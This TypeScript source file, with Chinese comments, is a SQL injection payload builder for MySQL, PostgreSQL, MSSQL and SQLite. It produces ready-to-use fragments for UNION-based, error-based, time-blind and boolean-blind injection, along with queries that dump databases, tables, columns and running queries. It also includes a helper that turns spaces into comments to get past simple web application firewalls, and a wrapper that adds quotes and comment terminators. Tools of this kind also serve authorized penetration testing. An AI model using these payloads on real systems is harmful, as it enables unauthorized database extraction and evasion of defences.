/**
 * SQLi 语句生成器。按 DBMS 分组建模，UI 只负责选组、填参数、插入。
 * 生成的是"语句片段"，是否补前导引号 / 闭合注释由 UI 的上下文开关决定。
 */

export type Dbms = 'mysql' | 'postgres' | 'mssql' | 'sqlite'

export interface SqliContext {
  /** UNION 的列数 */
  columns: number
  /** 目标表名，用于 dump columns */
  table: string
  /** 是否在语句前补一个单引号闭合原值 */
  quote: boolean
  /** 是否在末尾补 `-- -` 注释掉剩余 SQL */
  comment: boolean
}

export interface SqliItem {
  id: string
  /** 插入后是否需要在前面补 `'` */
  needsQuote: boolean
}

export const SQLI_ITEMS: Record<Dbms, SqliItem[]> = {
  mysql: [
    { id: 'version', needsQuote: false },
    { id: 'dumpDatabases', needsQuote: false },
    { id: 'dumpTables', needsQuote: false },
    { id: 'dumpColumns', needsQuote: false },
    { id: 'unionSelect', needsQuote: true },
    { id: 'errorBased', needsQuote: true },
    { id: 'dios', needsQuote: false },
    { id: 'currentQuery', needsQuote: false },
    { id: 'timeBlind', needsQuote: true },
    { id: 'boolBlind', needsQuote: true },
  ],
  postgres: [
    { id: 'version', needsQuote: false },
    { id: 'dumpDatabases', needsQuote: false },
    { id: 'dumpTables', needsQuote: false },
    { id: 'dumpColumns', needsQuote: false },
    { id: 'unionSelect', needsQuote: true },
    { id: 'errorBased', needsQuote: true },
    { id: 'currentQuery', needsQuote: false },
    { id: 'timeBlind', needsQuote: true },
  ],
  mssql: [
    { id: 'version', needsQuote: false },
    { id: 'dumpDatabases', needsQuote: false },
    { id: 'dumpTables', needsQuote: false },
    { id: 'dumpColumns', needsQuote: false },
    { id: 'unionSelect', needsQuote: true },
    { id: 'errorBased', needsQuote: true },
    { id: 'timeBlind', needsQuote: true },
  ],
  sqlite: [
    { id: 'version', needsQuote: false },
    { id: 'dumpTables', needsQuote: false },
    { id: 'dumpColumns', needsQuote: false },
    { id: 'unionSelect', needsQuote: true },
    { id: 'boolBlind', needsQuote: true },
  ],
}

function hexLiteral(text: string): string {
  if (!text) return "''"
  const bytes = new TextEncoder().encode(text)
  return `0x${Array.from(bytes)
    .map((b) => b.toString(16).padStart(2, '0'))
    .join('')}`
}

export function buildSqli(dbms: Dbms, item: string, ctx: SqliContext): string {
  const columnCount = Math.max(1, Math.min(50, ctx.columns || 3))
  const union = `UNION SELECT ${Array.from({ length: columnCount }, (_, i) => i + 1).join(',')}`

  const table = ctx.table || 'users'

  const map: Record<Dbms, Record<string, () => string>> = {
    mysql: {
      version: () => '@@version',
      dumpDatabases: () =>
        '(SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM information_schema.schemata)',
      dumpTables: () =>
        '(SELECT GROUP_CONCAT(table_name SEPARATOR 0x3c62723e) FROM information_schema.tables WHERE table_schema=database())',
      dumpColumns: () =>
        `(SELECT GROUP_CONCAT(column_name SEPARATOR 0x3c62723e) FROM information_schema.columns WHERE table_schema=database() AND table_name=${hexLiteral(table)})`,
      unionSelect: () => union,
      errorBased: () =>
        `AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)`,
      dios: () =>
        '(SELECT CONCAT(0x7e,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),0x7e))',
      currentQuery: () =>
        '(SELECT GROUP_CONCAT(info SEPARATOR 0x3c62723e) FROM (SELECT CONCAT(user,0x3a,host,0x3a,db,0x3a,command,0x3a,time,0x3a,state,0x3a,info) info FROM information_schema.processlist WHERE info IS NOT NULL)x)',
      timeBlind: () => 'AND IF(1=1,SLEEP(5),0)',
      boolBlind: () => 'AND 1=1',
    },
    postgres: {
      version: () => 'version()',
      dumpDatabases: () => '(SELECT string_agg(datname,\',\') FROM pg_database)',
      dumpTables: () =>
        "(SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public')",
      dumpColumns: () =>
        `(SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='${table.replace(/'/g, "''")}')`,
      unionSelect: () => union,
      errorBased: () => 'AND 1=CAST((SELECT current_database()) AS int)',
      currentQuery: () => "(SELECT string_agg(query,',') FROM pg_stat_activity)",
      timeBlind: () => "AND 1=(SELECT 1 FROM pg_sleep(5))",
    },
    mssql: {
      version: () => '@@version',
      dumpDatabases: () => "(SELECT STRING_AGG(name,',') FROM sys.databases)",
      dumpTables: () => "(SELECT STRING_AGG(name,',') FROM sys.tables)",
      dumpColumns: () =>
        `(SELECT STRING_AGG(name,',') FROM sys.columns WHERE object_id=OBJECT_ID('${table.replace(/'/g, "''")}'))`,
      unionSelect: () => union,
      errorBased: () => 'AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.databases))',
      timeBlind: () => ";WAITFOR DELAY '0:0:5'--",
    },
    sqlite: {
      version: () => 'sqlite_version()',
      dumpTables: () => "(SELECT group_concat(name,',') FROM sqlite_master WHERE type='table')",
      dumpColumns: () =>
        `(SELECT group_concat(name,',') FROM pragma_table_info('${table.replace(/'/g, "''")}'))`,
      unionSelect: () => union,
      boolBlind: () => 'AND 1=1',
    },
  }

  const builder = map[dbms]?.[item]
  return builder ? builder() : ''
}

/** 把空格换成内联注释，用于绕简单 WAF */
export function spaceToComment(sql: string, style: 'inline' | 'versioned' = 'inline'): string {
  return style === 'inline' ? sql.replace(/ /g, '/**/') : sql.replace(/ /g, '/*!50000*/')
}

/** 把整条 union 语句包装成可直接塞进参数的 payload */
export function wrapSqli(statement: string, needsQuote: boolean, ctx: SqliContext): string {
  if (!statement) return ''
  let out = statement
  if (needsQuote) {
    const prefix = ctx.quote ? "'" : ''
    const suffix = ctx.comment ? '-- -' : ''
    out = `${prefix} ${out}${suffix ? ` ${suffix}` : ''}`
  }
  return out.trim()
}
